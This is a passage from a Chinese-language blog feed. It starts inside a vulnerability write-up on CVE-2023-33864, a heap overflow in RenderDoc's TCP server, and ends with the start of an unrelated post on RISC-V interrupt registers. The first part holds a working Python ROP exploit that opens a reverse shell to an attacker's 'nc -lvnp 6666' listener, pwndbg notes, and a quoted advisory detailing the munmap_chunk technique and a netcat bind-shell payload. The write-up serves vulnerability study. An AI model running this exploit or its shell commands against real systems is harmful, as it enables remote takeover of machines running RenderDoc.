    <span class="n">pop_rsi_ret_addr</span> <span class="o">=</span> <span class="n">pop_rsi_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rax_ret_addr</span> <span class="o">=</span> <span class="n">pop_rax_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rbx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rbx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rcx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rcx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rdx_ret_addr</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">xchg_rdi_rax_ret_addr</span> <span class="o">=</span> <span class="n">xchg_rdi_rax_ret</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">binsh_off</span> <span class="o">+</span> <span class="n">heap_base</span>
    <span class="n">sockaddr_addr</span> <span class="o">=</span> <span class="n">binsh_addr</span> <span class="o">+</span> <span class="mh">0x8</span>
    
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">heap base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">text base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">libc base address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">dup2  address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">execve  address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">ret gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rdi_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rsi_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">xchg_rdi_rax_ret gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">xchg_rdi_rax_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rax_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rax_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rbx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rbx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rcx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rcx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">pop_rdx_gadget gadget address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">binsh address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="c1"># step 7: spawn a remote shell
</span>    <span class="c1"># fd = 6
</span>    <span class="n">rop_chain</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
    <span class="c1">#struct sockaddr_in
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x010011ac0a1a0002</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000556b2b358120</span><span class="p">)</span>
    
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26c</span>
    <span class="c1"># int fd = socket(AF_INET, SOCK_STREAM, 0);
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">socket_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 0)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 1)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># dup2(7, 2)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
    <span class="c1"># connect(fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sockaddr_addr</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">connect_addr</span><span class="p">)</span>
    <span class="c1"># execv("/bin/sh", NULL)
</span>    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> 
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>
    <span class="n">rop_chain</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
    
    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
             <span class="nf">p32</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop_chain</span> <span class="o">+</span> \
             <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
             
    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">**** enjoy reverse shell on </span><span class="sh">'</span><span class="s">$ nc -lvnp 6666</span><span class="sh">'</span><span class="s">  ****</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>运行结果：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-05-21_093704.png" alt="批注 2025-05-21 093704.png" /></p>

<h1 id="pwndbg命令学习">pwndbg命令学习</h1>

<ul>
  <li>info thread：查看线程信息</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; info thread
  Id   Target Id                                          Frame 
  1    Thread 0x7f500cf56dc0 <span class="o">(</span>LWP 2989<span class="o">)</span> <span class="s2">"sleep"</span>           0x00007f500d54223f <span class="k">in </span>__GI___clock_nanosleep <span class="o">(</span><span class="nv">clock_id</span><span class="o">=</span>clock_id@entry<span class="o">=</span>0, 
    <span class="nv">flags</span><span class="o">=</span>flags@entry<span class="o">=</span>0, <span class="nv">req</span><span class="o">=</span>0x7ffd00b15e60, <span class="nv">rem</span><span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
<span class="k">*</span> 2    Thread 0x7f500cf53700 <span class="o">(</span>LWP 2991<span class="o">)</span> <span class="s2">"TargetControlSe"</span> 0x00007f500d54223f <span class="k">in </span>__GI___clock_nanosleep <span class="o">(</span><span class="nv">clock_id</span><span class="o">=</span>clock_id@entry<span class="o">=</span>0, 
    <span class="nv">flags</span><span class="o">=</span>flags@entry<span class="o">=</span>0, <span class="nv">req</span><span class="o">=</span>req@entry<span class="o">=</span>0x7f500cf52ae0, <span class="nv">rem</span><span class="o">=</span>rem@entry<span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
</code></pre></div></div>

<ul>
  <li>thread id：切换到线程id，后面的heap等命令查看的就是某个线程的堆了</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; thread 2
<span class="o">[</span>Switching to thread 2 <span class="o">(</span>Thread 0x7f500cf53700 <span class="o">(</span>LWP 2991<span class="o">))]</span>
<span class="c">#0  0x00007f500d54223f in __GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, req=req@entry=0x7f500cf52ae0, </span>
    <span class="nv">rem</span><span class="o">=</span>rem@entry<span class="o">=</span>0x0<span class="o">)</span> at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
78      <span class="k">in</span> ../sysdeps/unix/sysv/linux/clock_nanosleep.c
</code></pre></div></div>

<ul>
  <li>ignore break_point_num NUM：break_point_num 断点命中第NUM次后断下</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; info <span class="nb">break
</span>Num     Type           Disp Enb Address            What
4       breakpoint     keep y   0x00007f4d57ced01e <span class="k">in </span>RenderDoc::TargetControlServerThread<span class="o">(</span>Network::Socket<span class="k">*</span><span class="o">)</span> at /test/renderdoc/renderdoc/core/target_control.cpp:473
        breakpoint already hit 9 <span class="nb">times
</span>pwndbg&gt; ignore 4 8
Will ignore next 8 crossings of breakpoint 4.
</code></pre></div></div>

<h1 id="参考资料">参考资料</h1>

<p><a href="http://tukan.farm/2016/07/27/munmap-madness/">munmap madness · Online tukan sanctuary</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Exploitation
------------------------------------------------------------------------

1/ When librenderdoc.so's server thread is created, the glibc's malloc
allocates a new "heap" for this thread: 64MB of mmap()ed memory, whose
start address is aligned on a multiple of 64MB. Initially, this heap is
mmap()ed PROT_NONE, and is mprotect()ed read-write as needed by malloc:

    0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------

Note: the gap of unmapped memory between the heap and the libraries is
random (and smaller than 64MB), because the heap is aligned on 64MB but
the libraries are randomly aligned on 4KB (or sometimes 2MB) by ASLR.

2/ We (remote attackers) establish 7 successive connections to the
server on TCP port 38920: for each one of these connections, the server
creates a new thread (a "client thread"), allocates a new thread stack
(8MB+4KB of mmap()ed memory, for the stack and its guard page), and then
memory-leaks this stack (because the server does not call pthread_join()
when the client thread terminates abnormally, which prevents its stack
from being freed or reused for another client thread).

The goal of this step 2/ is simply to fill the random gap between the
heap and the libraries (with the help of a memory leak), to prevent any
future thread stack from being allocated into this gap. The reason for
doing this will become clear in step 7/.

3/ We connect to the server on TCP port 38920, send a handshake packet
that contains a 16MB client-name string (it must be longer than 10MB to
trigger CVE-2023-33864), and obtain the following layout for the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....
--|-+-+-+-+---------------------------------------------------------------

- F are fixed chunks of memory (at the very beginning of the heap) that
  were not allocated by us but whose sizes are known to us;

- I is the 64KB intermediary buffer mentioned in the previous section;

- L is a small chunk that was memory-leaked (or free()d but stored in an
  otherwise unused tcache) and whose size is exactly controlled by us;

- C is a small chunk (a "callstack" from our handshake packet) whose
  exact size and contents do not matter much.

4/ We overflow the intermediary buffer I (thanks to CVE-2023-33864),
overwrite L's malloc_chunk header with an unchanged size field, and
overwrite C's malloc_chunk header with arbitrary prev_size and size
fields.

5/ The server free()s the intermediary buffer I. This free() succeeds
despite our buffer overflow because we overwrote the malloc_chunk header
of I's next chunk (L) with an unchanged size; without L between I and C,
free()'s security checks would detect that we overwrote C's malloc_chunk
header with arbitrary sizes and would abort().

6/ The server free()s the small chunk C. Because we overwrote C's
malloc_chunk header with a size field whose IS_MMAPPED bit is set,
free() calls its internal function munmap_chunk():

------------------------------------------------------------------------
3018 static void
3019 munmap_chunk (mchunkptr p)
3020 {
3021   size_t pagesize = GLRO (dl_pagesize);
3022   INTERNAL_SIZE_T size = chunksize (p);
....
3026   uintptr_t mem = (uintptr_t) chunk2mem (p);
3027   uintptr_t block = (uintptr_t) p - prev_size (p);
3028   size_t total_size = prev_size (p) + size;
....
3034   if (__glibc_unlikely ((block | total_size) &amp; (pagesize - 1)) != 0
3035       || __glibc_unlikely (!powerof2 (mem &amp; (pagesize - 1))))
3036     malloc_printerr ("munmap_chunk(): invalid pointer");
....
3044   __munmap ((char *) block, total_size);
3045 }
------------------------------------------------------------------------

- we fully control prev_size and size (because p is a pointer to C's
  malloc_chunk header, which we overwrote), so we can munmap() an
  arbitrary block of memory (at line 3044), relative to p (i.e.,
  relative to C, and without knowing the ASLR);

- we can easily satisfy the preconditions at lines 3034 and 3035,
  because we fully control prev_size and size, and because we know the
  sizes of F and I, and we precisely control the size of L.

We exploit this arbitrary munmap() to punch a hole of exactly 8MB+4KB
(the size of a thread stack and its guard page) in the middle of the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  punched hole  |
--|-+-+-+-+----------------------------------+----------------+-----------

Note: we cannot reuse the technique that we developed to exploit
CVE-2005-1513 (in qmail) here, because of the random gap between the
server's heap and the libraries (and our exploit here must be one-shot);
for reference:

  https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt
  https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation
  https://www.ambionics.io/blog/hacking-watchguard-firewalls

7/ We connect to the server on TCP port 38920; the server creates a new
client thread, and allocates a new stack for this thread, exactly into
the hole that we punched in the server's heap (since step 2/ such a
stack cannot be allocated anymore into the random gap between the
server's heap and the libraries):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  client stack  |
--|-+-+-+-+----------------------------------+----------------+-----------

We then disconnect from the server; the client thread terminates cleanly
and the server pthread_join()s with it, thus making its stack available
for a future client thread.

8/ We establish a long-lived connection to the server, and send a 14MB
client-name string (but we do not trigger CVE-2023-33864 this time); the
server reads our client name into a malloc()ated string buffer that ends
in the middle of the unused client stack (i.e., this client name and the
client stack overlap in the server's heap):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|
                                        client name

Note: although the client stack's guard page is initially mmap()ed
PROT_NONE, it is conveniently mprotect()ed read-write by the glibc's
malloc when extending the server's heap for our 14MB client name (in
grow_heap())!

The server then creates a new client thread for our long-lived
connection, and reuses the existing client stack for this thread, thus
overwriting the end of our client name with data from the client stack.

9/ We establish another connection to the server; however, because our
first connection is still alive, the server disconnects us, but first
gives us the name of the client that is already connected (i.e., the
server sends us back our 14MB client name, which was partly overwritten
by data from the client stack), thus information-leaking all sorts of
stack contents to us: heap addresses, library addresses, stack
addresses, the stack canary, etc.

10/ While our first connection to the server is still alive, we
establish another connection and start sending a 9MB string; the server
reads this string into a malloc()ated buffer that starts in the middle
of the client stack (immediately after the 14MB client name), thus
overwriting the client stack with data that we fully control (a ROP
chain):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|---&gt;
                                        client name         ROP

As soon as the client thread returns to a saved instruction pointer
(RIP) from the overwritten part of the client stack, our ROP chain is
executed: first a "ROP sled" (a series of minimal "ret" gadgets, because
we do not know the exact distance between the start of our ROP chain and
the first overwritten saved RIP in the client stack), followed by a
simple execve() of "/bin/nc -lp1337 -e/bin/bash".

Note: we build our ROP chain with gadgets from librenderdoc.so only
(whose address was information-leaked to us in step 9/), to avoid any
dependence on the application being debugged or its shared libraries.

To summarize this reliable, one-shot technique that we used to exploit
the heap-based buffer overflow in librenderdoc.so's multi-threaded TCP
server:

- we overwrite the malloc_chunk header of a heap-based buffer (which
  will be free()d) with an arbitrary size field whose IS_MMAPPED bit is
  set, and therefore transform this buffer overflow into an arbitrary
  munmap() call (thanks to free()'s munmap_chunk() function);

- with this arbitrary munmap() call, we punch a hole of exactly 8MB+4KB
  (the size of a thread stack) in the middle of the server's heap;

- we arrange for a thread stack to be mmap()ed into this hole, and for a
  string (which will later be sent to us by the server) to be
  malloc()ated over the lower part of this thread stack;

- when this string is sent to us by the server, parts of it were
  overwritten by data from the thread stack, thus information-leaking
  all sorts of stack contents to us (heap addresses, library addresses,
  stack addresses, the stack canary, etc);

- finally, we arrange for another string (which we fully control) to be
  malloc()ated over the higher part of the thread stack, and therefore
  overwrite a saved instruction pointer (in the thread stack) with a ROP
  chain of gadgets from librenderdoc.so (whose address was previously
  information-leaked to us) -- a classic "stack smashing" attack.

Note: further possibilities for munmap_chunk() exploitation are explored
in http://tukan.farm/2016/07/27/munmap-madness/.

</code></pre></div></div>]]></content><author><name></name></author><category term="userspace" /><summary type="html"><![CDATA[RenderDoc 是一款开源的图形调试工具，主要用于实时捕获、分析和调试 OpenGL 和 OpenGL ES 等图形 API 的渲染过程。它被广泛应用于 游戏开发、图形引擎优化、GPU 驱动问题排查等领域，支持 Windows、Linux 和 Android 平台。]]></summary></entry><entry><title type="html">几个中断寄存器的关系</title><link href="http://localhost:4000/riscv/2025/05/11/%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%AD%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB.html" rel="alternate" type="text/html" title="几个中断寄存器的关系" /><published>2025-05-11T13:27:38+08:00</published><updated>2025-05-11T13:27:38+08:00</updated><id>http://localhost:4000/riscv/2025/05/11/%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%AD%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB</id><content type="html" xml:base="http://localhost:4000/riscv/2025/05/11/%E5%87%A0%E4%B8%AA%E4%B8%AD%E6%96%AD%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB.html"><![CDATA[<h1 id="risc-v中断处理过程">RISC-V中断处理过程</h1>

<p><a href="https://blog.csdn.net/zyhse/article/details/141054966">RISC-V特权架构 - 时钟中断处理_riscv mtime-CSDN博客</a></p>

<p><a href="https://blog.csdn.net/m0_53157173/article/details/131364904">MIT 6.S081 教材第五章内容 – 中断与设备驱动–下_mit 6.s081有教材吗-CSDN博客</a></p>

<h1 id="mie寄存器-与-mstatusmie位">mie寄存器 与 mstatus.MIE位</h1>

<h3 id="1-核心功能"><strong>1. 核心功能</strong></h3>

<table>
  <thead>
    <tr>
      <th><strong>寄存器/位</strong></th>
      <th><strong>作用</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong></td>
      <td><strong>全局中断开关</strong>：所有中断（包括M模式中断）的总使能。</td>
    </tr>
    <tr>
      <td><strong><code class="language-plaintext highlighter-rouge">mie</code></strong></td>
      <td><strong>局部中断开关</strong>：按中断类型（如定时器、外部、软件中断）分别控制是否使能。</td>
    </tr>
  </tbody>
</table>

<h3 id="2-中断触发的必要条件"><strong>2. 中断触发的必要条件</strong></h3>

<p>M模式下的中断（如定时器中断<strong><code class="language-plaintext highlighter-rouge">MTIP</code></strong>、外部中断<strong><code class="language-plaintext highlighter-rouge">MEIP</code></strong>）<strong>必须同时满足以下条件</strong>才会被响应：</p>

<ol>
  <li><strong>全局中断使能</strong>：<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE = 1</code></strong>（总开关打开）。</li>
  <li><strong>局部中断使能</strong>：<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>寄存器中对应中断类型的使能位为<strong><code class="language-plaintext highlighter-rouge">1</code></strong>（如<strong><code class="language-plaintext highlighter-rouge">mie.MTIE = 1</code></strong>允许定时器中断）。</li>
  <li><strong>中断未屏蔽</strong>：更高优先级的中断未阻塞当前中断（如无嵌套中断场景）。</li>
</ol>

<h3 id="3-关键字段详解"><strong>3. 关键字段详解</strong></h3>

<h3 id="1mstatusmie全局控制"><strong>(1) <code class="language-plaintext highlighter-rouge">mstatus.MIE</code>（全局控制）</strong></h3>

<ul>
  <li><strong>位置</strong>：<strong><code class="language-plaintext highlighter-rouge">mstatus</code></strong>寄存器的第3位。</li>
  <li><strong>行为</strong>：
    <ul>
      <li><strong><code class="language-plaintext highlighter-rouge">MIE=1</code></strong>：允许CPU响应所有中断（仍需<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>对应位使能）。</li>
      <li><strong><code class="language-plaintext highlighter-rouge">MIE=0</code></strong>：禁止所有中断（即使<strong><code class="language-plaintext highlighter-rouge">mie</code></strong>中已使能）。</li>
    </ul>
  </li>
  <li><strong>场景</strong>：
    <ul>
      <li>在异常处理或关键代码段中，通过清除<strong><code class="language-plaintext highlighter-rouge">MIE</code></strong>屏蔽中断。</li>
    </ul>
  </li>
</ul>

<h3 id="2mie寄存器局部控制"><strong>(2) <code class="language-plaintext highlighter-rouge">mie</code>寄存器（局部控制）</strong></h3>

<ul>
  <li><strong>关键位</strong>（以标准RISC-V为例）：</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bit | 名称    | 作用
----|---------|-----------------------------
11  | MEIE    | 外部中断使能（如PLIC中断）
7   | MTIE    | 定时器中断使能（如CLINT）
3   | MSIE    | 软件中断使能
</code></pre></div></div>

<ul>
  <li><strong>行为</strong>：
    <ul>
      <li>每个中断类型有独立的使能位，需单独设置。</li>
    </ul>
  </li>
</ul>

<h3 id="4-交互流程示例"><strong>4. 交互流程示例</strong></h3>

<h3 id="场景m模式下响应定时器中断mtip"><strong>场景：M模式下响应定时器中断（<code class="language-plaintext highlighter-rouge">MTIP</code>）</strong></h3>

<ol>
  <li><strong>初始化设置</strong>：</li>
</ol>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">csrsi</span> <span class="nv">mstatus</span><span class="p">,</span> <span class="mh">0x8</span>     <span class="err">#</span> <span class="err">设置</span><span class="nv">mstatus.MIE</span><span class="err">=</span><span class="mi">1</span><span class="err">（全局使能）</span>
<span class="nf">csrsi</span> <span class="nv">mie</span><span class="p">,</span> <span class="mh">0x80</span>        <span class="err">#</span> <span class="err">设置</span><span class="nv">mie.MTIE</span><span class="err">=</span><span class="mi">1</span><span class="err">（定时器中断使能）</span>
</code></pre></div></div>

<ol>
  <li><strong>中断触发条件</strong>：
    <ul>
      <li>CLINT生成定时器中断（<strong><code class="language-plaintext highlighter-rouge">MTIP=1</code></strong>）。</li>
    </ul>
  </li>
  <li><strong>CPU响应中断</strong>：
    <ul>
      <li>检查<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE &amp;&amp; mie.MTIE</code></strong>，若均为<strong><code class="language-plaintext highlighter-rouge">1</code></strong>，则跳转到<strong><code class="language-plaintext highlighter-rouge">mtvec</code></strong>指向的中断处理程序。</li>
    </ul>
  </li>
  <li><strong>中断处理中</strong>：
    <ul>
      <li>硬件自动清除<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>（进入中断后默认关闭全局中断，防止嵌套）。</li>
      <li>处理完成后通过<strong><code class="language-plaintext highlighter-rouge">mret</code></strong>恢复<strong><code class="language-plaintext highlighter-rouge">mstatus.MIE</code></strong>（返回前可能手动重新使能）。</li>
    </ul>
  </li>
</ol>

<h3 id="5-典型问题与注意事项"><strong>5. 典型问题与注意事项</strong></h3>

<h3 id="1-为什么中断未触发"><strong>(1) 为什么中断未触发？</strong></h3>

<ul>
  <li>检查顺序：
    <ol>
